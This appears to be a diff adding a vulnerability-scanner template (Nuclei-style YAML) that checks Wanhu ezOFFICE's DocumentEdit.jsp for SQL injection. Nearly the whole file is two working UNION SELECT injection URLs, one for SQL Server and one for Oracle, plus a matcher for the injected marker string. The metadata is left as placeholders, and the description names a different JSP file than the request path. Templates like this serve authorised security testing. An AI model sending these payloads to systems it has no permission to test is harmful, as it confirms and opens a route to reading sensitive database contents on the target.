@@ -1,0 +1,22 @@
+id: wanhuOA-DocumentID-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 北京万户网络技术有限公司ezOFFICE OfficeServer.jsp 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=11'+UNION+ALL+SELECT+NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL--+QAJc&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1"
+      - "{{BaseURL}}/defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(68)%7C%7CCHR(72)%7C%7CCHR(116)%7C%7CCHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113)+FROM+DUAL--+ONYT&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkqpqDH'
